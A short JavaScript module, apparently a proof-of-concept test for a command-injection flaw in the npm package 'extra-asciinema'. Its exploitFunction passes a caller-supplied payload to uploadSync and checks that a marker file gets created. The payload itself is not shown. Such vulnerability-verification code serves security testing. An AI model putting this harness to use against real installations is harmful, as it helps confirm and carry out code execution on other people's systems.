const asciinema = require("extra-asciinema");

function exploitFunction(payload) {
  const fs = require("fs");
  const path = "./extra-asciinema";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  asciinema.uploadSync(payload);

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
}

module.exports = { exploitFunction };